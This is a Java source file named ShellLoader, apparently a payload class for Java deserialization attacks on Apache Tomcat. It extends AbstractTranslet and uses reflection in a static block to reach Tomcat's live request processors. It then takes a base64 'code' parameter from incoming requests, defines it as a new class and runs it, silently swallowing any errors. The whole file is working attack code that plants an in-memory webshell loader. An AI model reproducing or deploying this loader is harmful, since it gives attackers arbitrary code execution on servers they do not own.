import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.*;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.RequestInfo;

import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;


public class ShellLoader extends AbstractTranslet{
    public static Object getField(Object obj, Class<?> clazz, String... fieldNames) throws Exception {
        for (String part : fieldNames) {
            String[] segs = part.split("_", 2);
            Field field = clazz.getDeclaredField(segs[0].split(":")[0]);
            field.setAccessible(true);
            obj = field.get(obj);
            if (segs.length > 1) {
                String[] parts = segs[1].split(":", 2);
                int idx = Integer.parseInt(parts[0]);
                obj = obj instanceof List ? ((List<?>) obj).get(idx) : Array.get(obj, idx);
                clazz = parts.length > 1 ? Class.forName(parts[1]) : obj.getClass();
            } else {
                clazz = part.contains(":") ? Class.forName(part.split(":")[1]) : field.getType();
            }
        }
        return obj;
    }
    static{
        try {
            ArrayList<RequestInfo> infos = (ArrayList<RequestInfo>) getField(
                    Thread.currentThread().getContextClassLoader(),
                    WebappClassLoaderBase.class,
                    "resources:org.apache.catalina.webresources.StandardRoot",
                    "context:org.apache.catalina.core.StandardContext",
                    "context",
                    "service:org.apache.catalina.core.StandardService",
                    "connectors_0:org.apache.catalina.connector.Connector",
                    "protocolHandler:org.apache.coyote.AbstractProtocol",
                    "handler:org.apache.coyote.AbstractProtocol$ConnectionHandler",
                    "global", "processors"
            );
            for (RequestInfo ri : infos){
                org.apache.coyote.Request r = (org.apache.coyote.Request)getField(ri, RequestInfo.class, "req");
                Request  req = (Request) r.getNote(1);
                Response resp = req.getResponse();

                PrintWriter out = resp.getWriter();
                out.flush();

                byte[] bytes = Base64.getDecoder().decode(req.getParameter("code"));
                Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                method.setAccessible(true);
                Class clazz = (Class) method.invoke(ShellLoader.class.getClassLoader(), bytes, 0, bytes.length);
                out.println("load success, classInfo: "+clazz.getName());
                clazz.newInstance();
            }
        } catch (Exception e) {}
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler){}
}